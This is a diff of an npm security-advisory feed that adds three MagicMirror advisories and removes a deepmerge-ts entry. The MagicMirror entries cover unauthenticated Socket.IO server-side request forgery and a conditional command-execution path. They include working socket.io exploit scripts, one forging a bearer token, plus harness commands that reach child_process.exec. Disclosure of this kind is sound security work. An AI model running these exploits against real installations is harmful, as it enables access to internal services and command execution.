@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-08-18T17:15:48.785Z</updated>
+    <updated>2026-08-18T17:46:13.481Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,370 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[magicmirror] MagicMirror: ssrf calendar .js]]></title>
+        <id>https://github.com/advisories/GHSA-w6x9-28jw-hq7j</id>
+        <link href="https://github.com/advisories/GHSA-w6x9-28jw-hq7j"/>
+        <updated>2026-08-18T17:26:53.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="vulnerability--ssrf-via-add_calendar-magicmirror²-calendar">Vulnerability — SSRF via <code>ADD_CALENDAR</code> (MagicMirror² calendar)</h1>
+<blockquote>
+<p>Analysis of the PoC <code>exploit-ssrf-calendar.js</code>.
+Target: <code>calendar/node_helper.js</code> of MagicMirror², socket.io namespace <code>/calendar</code>.</p>
+</blockquote>
+<hr>
+<h2 id="identification">Identification</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PoC file</strong></td>
+<td><code>exploit-ssrf-calendar.js</code></td>
+</tr>
+<tr>
+<td><strong>Endpoint</strong></td>
+<td>socket.io namespace <code>/calendar</code>, notification <code>ADD_CALENDAR</code></td>
+</tr>
+<tr>
+<td><strong>Precondition</strong></td>
+<td>reach the mirror's HTTP port (no authentication required)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="description">Description</h2>
+<p>The <code>ADD_CALENDAR</code> handler in <code>calendar/node_helper.js</code> performs a <strong>server-side</strong> HTTP request to a URL that is <strong>fully attacker-controlled</strong>, with no SSRF protection whatsoever — unlike the project's hardened <code>/cors</code> endpoint.</p>
+<p>Worse, the attacker also controls:</p>
+<ul>
+<li>the <strong>authentication headers</strong> the server attaches to the request (<code>auth: { method: "bearer", pass: "..." }</code>);</li>
+<li>the <code>selfSignedCert</code> flag, which <strong>disables TLS verification</strong> of the server-side request.</li>
+</ul>
+<p>When the target's response is <strong>valid iCal</strong>, the server parses the events and sends them back to the attacker via <code>CALENDAR_EVENTS</code> — turning the SSRF into <strong>full data exfiltration</strong> (response body read). Against non-iCal responses it remains a blind SSRF (the attacker still forces the server-side request, they just don't see the body).</p>
+<hr>
+<h2 id="root-cause-unauthenticated-socketio-channel--permissive-cors">Root cause: unauthenticated socket.io channel + permissive CORS</h2>
+<p>The socket.io server accepts connections from <strong>any origin</strong> and with <strong>no authentication</strong>:</p>
+<pre><code class="language-js">const io = new Server(server, {
+  cors: { origin: /.*$/, credentials: true }
+});
+</code></pre>
+<p>The <code>/calendar</code> namespace registers the handler without checking who is connected (<strong>CWE-306</strong>). Any process or browser tab that can reach the mirror's port can emit the notification.</p>
+<hr>
+<h2 id="exploit-exploit-ssrf-calendarjs">Exploit (<code>exploit-ssrf-calendar.js</code>)</h2>
+<pre><code class="language-js">const { io } = require("socket.io-client");
+
+const TARGET = process.env.MM || "http://TARGET:8888";
+const INTERNAL_URL = process.argv[2] || process.env.SSRF_URL || "https://webhook.site/";
+
+const socket = io(`${TARGET}/calendar`, { path: "/socket.io", transports: ["websocket", "polling"] });
+
+socket.onAny((event, payload) =&gt; {
+    if (event === "CALENDAR_EVENTS") {
+        console.log("\n[+] CALENDAR_EVENTS received from server (SSRF response exfiltrated):");
+        for (const ev of payload.events || []) {
+            console.log("    SUMMARY:", ev.title);
+            if (ev.title &amp;&amp; ev.title.includes("FLAG{")) {
+                console.log("\n[!!!] SSRF SUCCESS - leaked secret from internal-only service:");
+                console.log("      " + ev.title);
+                process.exit(0);
+            }
+        }
+    } else if (event === "CALENDAR_ERROR") {
+        console.log("[-] CALENDAR_ERROR:", JSON.stringify(payload));
+    }
+});
+
+socket.on("connect", () =&gt; {
+    console.log(`[*] Connected to ${TARGET}/calendar (no auth required). socket id=${socket.id}`);
+    console.log(`[*] Forcing server-side fetch of internal target: ${INTERNAL_URL}`);
+    socket.emit("ADD_CALENDAR", {
+        url: INTERNAL_URL,
+        fetchInterval: 60000,
+        excludedEvents: [],
+        maximumEntries: 10,
+        maximumNumberOfDays: 3650,
+        auth: { method: "bearer", pass: "internal-admin-token" },
+        broadcastPastEvents: true,
+        selfSignedCert: true,
+        id: "pwn"
+    });
+});
+
+socket.on("connect_error", (e) =&gt; console.log("[-] connect_error:", e.message));
+
+setTimeout(() =&gt; { console.log("\n[*] timeout, exiting"); process.exit(1); }, 20000);
+</code></pre>
+<hr>
+<h2 id="vulnerable-target-code-pattern">Vulnerable target code (pattern)</h2>
+<pre><code class="language-js">socketNotificationReceived(notification, payload) {
+  if (notification === "ADD_CALENDAR") {
+    const fetcher = new CalendarFetcher(
+      payload.url,
+      payload.fetchInterval,
+      payload.excludedEvents,
+      payload.maximumEntries,
+      payload.maximumNumberOfDays,
+      payload.auth,
+      payload.broadcastPastEvents,
+      payload.selfSignedCert
+    );
+    fetcher.fetchCalendar();
+  }
+}
+</code></pre>
+<hr>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Reading internal services</strong> unreachable from the attacker's network (cloud metadata <code>169.254.169.254</code>, admin panels on <code>127.0.0.1</code>, services on the private network).</li>
+<li><strong>Body exfiltration</strong> when the response is iCal (the PoC searches for <code>FLAG{...}</code> in event titles).</li>
+<li><strong>Confused deputy / credential injection</strong>: the server attaches an attacker-controlled <code>Authorization: Bearer ...</code> header, allowing it to forge/replay credentials against the internal target.</li>
+<li><strong>TLS bypass</strong> via <code>selfSignedCert: true</code>.</li>
+<li>Internal port scanning through error/timing differences.</li>
+</ul>
+<hr>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w6x9-28jw-hq7j">https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w6x9-28jw-hq7j</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/pull/4169">https://github.com/MagicMirrorOrg/MagicMirror/pull/4169</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f">https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0">https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-w6x9-28jw-hq7j">https://github.com/advisories/GHSA-w6x9-28jw-hq7j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w6x9-28jw-hq7j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-18T17:26:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[magicmirror] MagicMirror newsfeed Socket.IO notification allows blind server-side request forgery]]></title>
+        <id>https://github.com/advisories/GHSA-998g-7v5w-cr7g</id>
+        <link href="https://github.com/advisories/GHSA-998g-7v5w-cr7g"/>
+        <updated>2026-08-18T17:26:48.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="vulnerability--blind-ssrf-via-check_article_url-magicmirror²-newsfeed">Vulnerability — Blind SSRF via <code>CHECK_ARTICLE_URL</code> (MagicMirror² newsfeed)</h1>
+<blockquote>
+<p>Analysis of the PoC <code>exploit-ssrf-newsfeed.js</code>.
+Target: <code>newsfeed/node_helper.js</code> of MagicMirror², socket.io namespace <code>/newsfeed</code>.</p>
+</blockquote>
+<hr>
+<h2 id="identification">Identification</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PoC file</strong></td>
+<td><code>exploit-ssrf-newsfeed.js</code></td>
+</tr>
+<tr>
+<td><strong>Endpoint</strong></td>
+<td>socket.io namespace <code>/newsfeed</code>, notification <code>CHECK_ARTICLE_URL</code></td>
+</tr>
+<tr>
+<td><strong>Precondition</strong></td>
+<td>reach the mirror's HTTP port (no authentication required)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="description">Description</h2>
+<p>The <code>checkArticleUrl()</code> function in <code>newsfeed/node_helper.js</code> runs <code>fetch(url, { method: "HEAD" })</code> with <strong>zero validation</strong> of the URL and returns <code>ARTICLE_URL_STATUS { url, canFrame }</code>.</p>
+<p>This gives the attacker a <strong>boolean + timing oracle</strong> to map internal hosts and ports: presence, absence, and response time reveal which internal services are alive. It is a "blind-ish" SSRF — the attacker doesn't see the body, but forces the server-side request and observes the effect on the target.</p>
+<p>The actual proof is observed <strong>on the target side</strong> (the server-side HEAD shows up in the internal service's log), since the <code>canFrame</code> field alone leaks little.</p>
+<hr>
+<h2 id="root-cause-unauthenticated-socketio-channel--permissive-cors">Root cause: unauthenticated socket.io channel + permissive CORS</h2>
+<p>The socket.io server accepts connections from <strong>any origin</strong> and with <strong>no authentication</strong>:</p>
+<pre><code class="language-js">const io = new Server(server, {
+  cors: { origin: /.*$/, credentials: true }
+});
+</code></pre>
+<p>The <code>/newsfeed</code> namespace registers the handler without checking who is connected (<strong>CWE-306</strong>). Any process or browser tab that can reach the mirror's port can emit the notification.</p>
+<hr>
+<h2 id="exploit-exploit-ssrf-newsfeedjs">Exploit (<code>exploit-ssrf-newsfeed.js</code>)</h2>
+<pre><code class="language-js">const { io } = require("socket.io-client");
+const TARGET = process.env.MM || "https://target/";
+const URL_TO_HIT = process.env.SSRF_URL || "https://webhook.site";
+const socket = io(`${TARGET}/newsfeed`, { path: "/socket.io", transports: ["websocket", "polling"] });
+
+socket.onAny((event, payload) =&gt; {
+    if (event === "ARTICLE_URL_STATUS") {
+        console.log(`[+] ARTICLE_URL_STATUS: ${JSON.stringify(payload)}`);
+        console.log("[!!!] Server performed a server-side HEAD request to the internal host (SSRF).");
+        process.exit(0);
+    }
+});
+socket.on("connect", () =&gt; {
+    console.log(`[*] Connected to ${TARGET}/newsfeed (no auth). CHECK_ARTICLE_URL -&gt; ${URL_TO_HIT}`);
+    socket.emit("CHECK_ARTICLE_URL", { url: URL_TO_HIT });
+});
+setTimeout(() =&gt; { console.log("[*] timeout"); process.exit(1); }, 12000);
+</code></pre>
+<hr>
+<h2 id="vulnerable-target-code-pattern">Vulnerable target code (pattern)</h2>
+<pre><code class="language-js">async checkArticleUrl(url) {
+  const res = await fetch(url, { method: "HEAD" });
+  const canFrame = !res.headers.get("x-frame-options")
+                &amp;&amp; !/frame-ancestors/i.test(res.headers.get("content-security-policy") || "");
+  this.sendSocketNotification("ARTICLE_URL_STATUS", { url, canFrame });
+}
+</code></pre>
+<hr>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Internal network scanning / port scanning</strong>: presence, absence, and response time reveal which internal hosts and ports are alive.</li>
+<li>Forcing server-side requests to internal services (the HEAD reaches the target, as observed in the <code>mm-internal</code> log referenced by the PoC).</li>
+<li>Although it's HEAD (no body), it serves as a <strong>reconnaissance primitive</strong> and a trigger for side effects on endpoints that react to GET/HEAD.</li>
+</ul>
+<hr>
+<h3 id="references">References</h3>
+<ul>
+<li>CWE-918: Server-Side Request Forgery (SSRF)</li>
+<li>CWE-306: Missing Authentication for Critical Function</li>
+<li>CWE-942: Permissive Cross-domain Policy with Untrusted Domains</li>
+<li>OWASP: SSRF Prevention Cheat Sheet</li>
+</ul>
+<blockquote>
+<p>This PoC and report are intended solely for authorized security testing / research in a controlled lab environment.</p>
+</blockquote>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-998g-7v5w-cr7g">https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-998g-7v5w-cr7g</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/pull/4169">https://github.com/MagicMirrorOrg/MagicMirror/pull/4169</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f">https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0">https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-998g-7v5w-cr7g">https://github.com/advisories/GHSA-998g-7v5w-cr7g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-998g-7v5w-cr7g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-18T17:26:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[magicmirror] MagicMirror Socket.IO module namespaces bypass configured IP whitelist and allow unauthenticated server-side actions]]></title>
+        <id>https://github.com/advisories/GHSA-w26r-fwg8-rcp3</id>
+        <link href="https://github.com/advisories/GHSA-w26r-fwg8-rcp3"/>
+        <updated>2026-08-18T17:26:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>MagicMirror applies <code>ipWhitelist</code> only as Express middleware, but the Socket.IO server is attached directly to the HTTP server without equivalent IP allowlist, origin, or namespace authentication checks. In a documented common deployment where MagicMirror listens on a non-loopback interface but expects <code>ipWhitelist</code> to restrict access, an untrusted network client can connect directly to module Socket.IO namespaces and send arbitrary module-helper notifications. This allows unauthenticated server-side requests through default modules and can reach command execution in the default <code>updatenotification</code> helper when a third-party module update is pending and the attacker supplies the update command through the trusted socket configuration path.</p>
+<h3 id="details">Details</h3>
+<p>The affected product is the npm package/application <code>magicmirror</code> at version <code>2.36.0</code>, tested at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code> from <code>https://github.com/MagicMirrorOrg/MagicMirror.git</code>.</p>
+<p>Default committed settings bind to loopback and allow loopback only (<code>js/defaults.js:8-13</code>), so the remote network impact requires a documented common configuration where the server is reachable beyond loopback. The shipped sample explicitly documents non-loopback binding and IP allowlist behavior: <code>config/config.js.sample:11-20</code> says <code>address</code> may be another interface or <code>0.0.0.0</code>/<code>::</code>, and <code>ipWhitelist</code> controls allowed clients.</p>
+<p>The trust-boundary issue is that Socket.IO is configured before and outside the Express middleware chain:</p>
+<ul>
+<li><code>js/server.js:42-50</code> creates Socket.IO directly on the HTTP(S) server with <code>cors.origin: /.*$/</code>.</li>
+<li><code>js/server.js:89-90</code> applies <code>ipAccessControl(config.ipWhitelist)</code> only with <code>app.use(...)</code>, which protects Express routes and static files but not Socket.IO handshakes or namespaces.</li>
+<li>A search of runtime files found no <code>allowRequest</code>, <code>io.use(...)</code>, handshake IP check, or namespace authentication for Socket.IO; the only relevant matches were <code>js/server.js:44</code> and <code>js/server.js:90</code>.</li>
+<li><code>js/node_helper.js:88-103</code> registers every module namespace and dispatches every socket event and payload directly to <code>socketNotificationReceived(...)</code>.</li>
+</ul>
+<p>Once a client can reach the Socket.IO server, the following default-module server-side actions are reachable without an equivalent IP whitelist or module-authentication check:</p>
+<ul>
+<li><code>defaultmodules/newsfeed/node_helper.js:12-17</code> accepts <code>CHECK_ARTICLE_URL</code> and calls <code>checkArticleUrl(payload.url)</code>.</li>
+<li><code>defaultmodules/newsfeed/node_helper.js:25-38</code> performs <code>fetch(url, { method: "HEAD" })</code> on the supplied URL and sends the result back.</li>
+<li><code>defaultmodules/calendar/node_helper.js:13-24</code> accepts <code>ADD_CALENDAR</code>/<code>FETCH_CALENDAR</code> socket messages.</li>
+<li><code>defaultmodules/calendar/node_helper.js:40-58</code> accepts an arbitrary syntactically valid calendar URL and creates a fetcher.</li>
+<li><code>defaultmodules/calendar/calendarfetcher.js:35-44</code> passes the URL into <code>HTTPFetcher</code>, whose fetch sink is <code>js/http_fetcher.js:286-294</code>.</li>
+<li><code>defaultmodules/updatenotification/node_helper.js:46-68</code> accepts <code>CONFIG</code>, <code>MODULES</code>, and <code>SCAN_UPDATES</code> notifications and trusts the socket-provided config/module list.</li>
+<li><code>defaultmodules/updatenotification/update_helper.js:43-47</code> stores update commands from config.</li>
+<li><code>defaultmodules/updatenotification/update_helper.js:96-116</code> executes the selected update command with <code>child_process.exec</code> in the module directory.</li>
+<li><code>defaultmodules/updatenotification/update_helper.js:221-227</code> looks up the command from <code>config.updates</code> by module name.</li>
+</ul>
+<p>False-positive screening performed:</p>
+<ul>
+<li>Express HTTP routes are protected by <code>ipAccessControl(config.ipWhitelist)</code> at <code>js/server.js:89-90</code>; this does not protect Socket.IO because Socket.IO is attached to the raw HTTP server and no Socket.IO middleware was found.</li>
+<li>The explicit <code>/cors</code> HTTP endpoint has separate SSRF mitigations (<code>js/server_functions.js:47-117</code>) and is disabled by default (<code>js/defaults.js:14</code>); the confirmed request primitive here uses module-helper socket paths, not <code>/cors</code>.</li>
+<li>The command-execution variant is not an unconditional default RCE: <code>updatenotification</code> only executes an update command for a non-core git-managed module that is considered behind. However, the trusted command source is attacker-controlled through the unauthenticated socket <code>CONFIG</code> message once this boundary is crossed.</li>
+<li>Default loopback-only binding lowers default remote exposure, but the sample configuration documents exactly the deployment model where users rely on <code>ipWhitelist</code> for network restrictions.</li>
+</ul>
+<p>Affected-version evidence: only <code>magicmirror@2.36.0</code> at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code> was tested. The affected range is unknown from this audit; earlier versions were not tested. No patched version or fix commit was identified locally.</p>
+<h3 id="poc">PoC</h3>
+<p>The following safe local PoCs were run from a clean checkout of MagicMirror at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code>. Because <code>node_modules</code> were not installed in this audit environment and <code>package.json:52</code> has a destructive <code>postinstall</code> (<code>git clean -df fonts vendor modules/default</code>), the commands use small Node harnesses with stubs for missing dependencies while exercising the vulnerable repository code paths directly. They do not contact external hosts and write only disposable <code>/tmp</code> marker files.</p>
+<ol>
+<li>Confirm that the runtime lacks Socket.IO IP allowlist controls:</li>
+</ol>
+<pre><code class="language-bash">grep -RIn --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=.claude --exclude-dir=reports -E "allowRequest|io\.use\(|handshake|ipAccessControl\(|cors: \{|origin: /\.\*\$/" js defaultmodules serveronly config tests
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">js/server.js:44:				cors: {
+js/server.js:90:			app.use(ipAccessControl(config.ipWhitelist));
+</code></pre>
+<p>This confirms the IP allowlist appears only as Express middleware and no Socket.IO handshake/namespace allowlist was present in the reviewed runtime files.</p>
+<ol start="2">
+<li>Confirm a default module helper will perform a server-side request to an attacker-supplied loopback URL when driven through its socket notification handler:</li>
+</ol>
+<pre><code class="language-bash">node -e 'const Module=require("module"); const orig=Module._load; Module._load=(r,p,m)=&gt;{ if(r==="logger") return {log(){},error(){},warn(){},info(){},debug(){}}; if(r==="node_helper") return {create:(o)=&gt;function(){Object.assign(this,o);this.sendSocketNotification=(n,p)=&gt;console.log("SOCKET",n,JSON.stringify(p));}}; if(r==="./newsfeedfetcher") return function(){}; return orig(r,p,m); }; const calls=[]; global.fetch=async(url,opts)=&gt;{calls.push({url,opts}); return {headers:{get:(h)=&gt;h==="x-frame-options"?"deny":null}};}; const Helper=require("./defaultmodules/newsfeed/node_helper"); const h=new Helper(); h.start(); h.socketNotificationReceived("CHECK_ARTICLE_URL",{url:"http://127.0.0.1:65535/internal"}); setTimeout(()=&gt;console.log("fetchCalls=",JSON.stringify(calls)),10);'
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">SOCKET ARTICLE_URL_STATUS {"url":"http://127.0.0.1:65535/internal","canFrame":false}
+fetchCalls= [{"url":"http://127.0.0.1:65535/internal","opts":{"method":"HEAD"}}]
+</code></pre>
+<p>Expected vulnerable output: the harness records a server-side <code>HEAD</code> request to <code>http://127.0.0.1:65535/internal</code> even though <code>/cors</code> SSRF protections are not involved.</p>
+<ol start="3">
+<li>Confirm the conditional command-execution sink is reachable from the trusted socket-driven update path using a harmless <code>/tmp</code> marker command:</li>
+</ol>
+<pre><code class="language-bash">rm -f /tmp/mm-rce-marker
+mkdir -p /tmp/mm-audit/modules/evil /tmp/mm-audit/defaultmodules
+node -e 'const fs=require("node:fs"); const Module=require("module"); const orig=Module._load; Module._load=(r,p,m)=&gt;{ if(r==="logger") return {log(){},error(){},warn(){},info(){},debug(){}}; if(r==="node_helper") return {create:(o)=&gt;function(){Object.assign(this,o);this.sendSocketNotification=()=&gt;{};}}; return orig(r,p,m); }; global.root_path="/tmp/mm-audit"; global.defaultModulesDir="defaultmodules"; fs.writeFileSync("/tmp/mm-audit/defaultmodules/defaultmodules.js","module.exports=[]"); const Helper=require("./defaultmodules/updatenotification/node_helper"); const h=new Helper(); h.gitHelper={add:async()=&gt;{},getRepos:async()=&gt;[{module:"evil",behind:1}],checkUpdates:()=&gt;[{module:"evil",behind:1}]}; h.sendSocketNotification=(n,p)=&gt;console.log("SOCKET",n,JSON.stringify(p)); (async()=&gt;{ await h.socketNotificationReceived("CONFIG",{updates:[{evil:"printf ok &gt; /tmp/mm-rce-marker"}],updateTimeout:5000,updateAutorestart:false,ignoreModules:[],sendUpdatesNotifications:false,updateInterval:60000,useModulesFromConfig:true}); await h.socketNotificationReceived("MODULES",["evil"]); console.log("marker=",fs.readFileSync("/tmp/mm-rce-marker","utf8")); process.exit(0); })();'
+rm -f /tmp/mm-rce-marker
+rm -rf /tmp/mm-audit
+</code></pre>
+<p>Observed output from the executed harness:</p>
+<pre><code class="language-text">SOCKET REPO_STATUS {"module":"evil","behind":1}
+SOCKET UPDATE_STATUS {"name":"evil","updateCommand":"printf ok &gt; /tmp/mm-rce-marker","inProgress":true,"error":false,"updated":true,"needRestart":true}
+marker= ok
+</code></pre>
+<p>Expected vulnerable output: <code>marker= ok</code> demonstrates the update command supplied through the trusted socket configuration path reached <code>child_process.exec</code> and wrote the harmless marker.</p>
+<p>Negative/control cases:</p>
+<ul>
+<li>With the shipped committed defaults (<code>js/defaults.js:8-13</code>), the server binds <code>localhost</code> and <code>ipWhitelist</code> includes only loopback, so a remote network attacker cannot reach either HTTP or Socket.IO unless the deployment is changed to a documented non-loopback address.</li>
+<li>The <code>updatenotification</code> command execution path requires at least one non-core module update result; if <code>checkUpdates()</code> returns no third-party module with <code>behind &gt; 0</code>, <code>update_helper.parse(...)</code> does not execute an update command.</li>
+<li>The explicit <code>/cors</code> route was not used for the confirmed request primitive and has separate protocol/hostname/DNS checks.</li>
+</ul>
+<p>Final repro re-check: the sink search, newsfeed socket request harness, and update marker harness were re-run after drafting; the observed outputs above are from this environment. Cleanup removed <code>/tmp/mm-rce-marker</code> and <code>/tmp/mm-audit</code>.</p>
+<h3 id="impact">Impact</h3>
+<p>In a documented common non-loopback deployment that relies on <code>ipWhitelist</code> for access control, an unauthenticated network client can bypass the intended IP allowlist for Socket.IO module namespaces. The attacker can send arbitrary module-helper notifications and payloads as if they were a trusted browser client.</p>
+<p>Confirmed impacts include:</p>
+<ul>
+<li>Confidentiality/SSRF: server-side requests to attacker-chosen URLs through default module helpers, including loopback/internal URLs. The newsfeed PoC shows a <code>HEAD</code> request to <code>127.0.0.1</code>.</li>
+<li>Integrity/availability: arbitrary manipulation of module-helper state and periodic fetch/update behavior through trusted socket messages.</li>
+<li>Conditional code execution: when a third-party git-managed module is considered behind by the update checker, an attacker can supply a command in the socket <code>CONFIG</code> payload and trigger <code>child_process.exec</code>; the PoC safely wrote a <code>/tmp</code> marker.</li>
+</ul>
+<p>CVSS 3.1 rationale for the primary trust-boundary bypass with confirmed SSRF and conditional RCE variant: AV:A because MagicMirror's security policy says it is intended for trusted local/private networks and the documented non-loopback exposure is LAN-style; AC:H because default loopback settings must be changed and the RCE variant requires a pending third-party module update, though SSRF requires fewer conditions after reachability; PR:N because no application authentication is required; UI:N because the attacker connects directly to Socket.IO; S:C because the vulnerable application can cause requests/actions against other local/internal services and can execute commands in a child process in the conditional variant; C:L/I:L/A:L for confirmed internal request and helper-state/command side effects, with conservative scoring because unconditional default RCE was not shown.</p>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<p>Apply the same access-control decision to Socket.IO handshakes and namespaces as to Express routes. Concretely, add a Socket.IO <code>allowRequest</code> or <code>io.use(...)</code> middleware that normalizes <code>socket.handshake.address</code>/request IPs with the same <code>ipAccessControl</code> logic, and reject clients not allowed by <code>config.ipWhitelist</code>. Avoid relying on CORS for authorization; keep origin checks as a browser hardening layer only.</p>
+<p>Also add module-helper authorization so arbitrary clients cannot send privileged server-side module notifications. For example, issue an unguessable per-session/module token to the served client and require it on helper messages, or separate read-only client events from privileged server-maintenance actions.</p>
+<p>For defense in depth:</p>
+<ul>
+<li>Add SSRF protections or allowlists to calendar/newsfeed/weather helper fetch paths, not only <code>/cors</code>.</li>
+<li>Do not accept <code>updatenotification</code> update commands from socket payloads; use the server-loaded config only, validate module names against configured modules, and avoid shell execution where possible.</li>
+<li>Add regression tests proving a disallowed IP receives a rejected Socket.IO handshake even when Express routes are protected, and proving <code>/newsfeed</code>/<code>/calendar</code> helper messages from unauthenticated sockets cannot trigger server-side requests or update commands.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w26r-fwg8-rcp3">https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w26r-fwg8-rcp3</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/pull/4169">https://github.com/MagicMirrorOrg/MagicMirror/pull/4169</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f">https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0">https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-w26r-fwg8-rcp3">https://github.com/advisories/GHSA-w26r-fwg8-rcp3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w26r-fwg8-rcp3</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-08-18T17:26:41.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@rhinostone/swig-django] @rhinostone/swig: arbitrary local file read via include/extends path traversal]]></title>
         <id>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</id>
@@ -1450,364 +1814,5 @@ The attack occurs during a legitimate login flow. The victim interacts with the 
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-08-17T13:36:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[deepmerge-ts] DeepmergeTS has stack exhaustion when merging recursive object graphs]]></title>
-        <id>https://github.com/advisories/GHSA-ggr8-5vv4-36mx</id>
-        <link href="https://github.com/advisories/GHSA-ggr8-5vv4-36mx"/>
-        <updated>2026-08-17T13:32:14.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>deepmerge()</code> and <code>deepmergeInto()</code> can be crashed with a crafted recursive object graph. When both merged values contain self-references at the same property path, the library recurses until Node throws <code>RangeError: Maximum call stack size exceeded</code>.</p>
-<h3 id="details">Details</h3>
-<p>Record merging is implemented recursively. For each enumerable key, the library collects the values from every input object and immediately calls the same merge routine on that property.</p>
-<p>There is no visited-object tracking, pair tracking, or cycle detection in that recursion. As a result, if two merged records both point back to themselves through the same key path, the merge logic keeps revisiting the same object pair forever.</p>
-<p>This is reachable through the real public API:</p>
-<ul>
-<li><code>deepmerge(...)</code></li>
-<li><code>deepmergeCustom(...)(...)</code></li>
-<li><code>deepmergeInto(target, ...)</code></li>
-<li><code>deepmergeIntoCustom(...)(target, ...)</code></li>
-</ul>
-<p>The issue only occurs when recursive object graphs are supplied. Plain JSON alone does not create this condition.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-js">import { deepmerge, deepmergeInto } from "deepmerge-ts";
-
-const left = {};
-left.self = left;
-
-const right = {};
-right.self = right;
-
-try {
-  deepmerge(left, right);
-} catch (error) {
-  console.log(error.name, error.message);
-  // Expected: the merge should reject or safely handle recursive input without exhausting the stack.
-  // Vulnerable behavior: RangeError Maximum call stack size exceeded
-}
-
-const target = {};
-target.self = target;
-
-const source = {};
-source.self = source;
-
-try {
-  deepmergeInto(target, source);
-} catch (error) {
-  console.log(error.name, error.message);
-  // Expected: the merge should reject or safely handle recursive input without exhausting the stack.
-  // Vulnerable behavior: RangeError Maximum call stack size exceeded
-}
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Applications that pass attacker-controlled recursive object graphs into these APIs can be forced into a synchronous crash path. In Node.js services, that can terminate request handling for the affected process or trigger repeated worker restarts until the malicious input is blocked.</p>
-<h3 id="references">References</h3>
-<ul>
